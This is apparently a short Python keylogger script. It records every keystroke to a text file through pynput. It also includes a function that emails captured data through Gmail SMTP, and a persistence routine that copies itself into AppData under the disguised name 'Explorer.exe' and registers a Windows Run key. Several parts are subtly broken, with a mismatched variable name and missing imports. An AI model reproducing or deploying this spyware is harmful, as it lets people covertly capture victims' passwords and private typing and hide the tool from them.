# dependencies
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/Pete/Desktop/" # directory to save the output .txt file to
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s') # basic configuration for the logging library

# function used to log every key pressed
def keypress(key):
    logging.info(str(key))

# additional function in case we ever wanted to send an email to a recipient of our choice instead of saving to a .txt file locally
def send_email(email, password, subject, message):
	# imports smtplib
	Email_message = 'Subject: {}\n\n{}'.format(subject, message)
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, Email_message)
	server.quit()

# if we want to make the keylogger permamently run on system startup
def add_registry(self):
	# Write the program to registry so that it runs with startup
	# Copy keylogger to Appdata folder
	# imports - os, shutil
	keylogger_path = os.environ["appdata"] + "\\Explorer.exe"
	if not os.path.exists(keylogger_location):
		shutil.copyfile(sys.executable, keylogger_location)
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "' + keylogger_location + '"', shell=True)

# the with statement used to trigger the above keypress function
while True:
	with Listener(on_press=keypress) as listener:
		listener.join()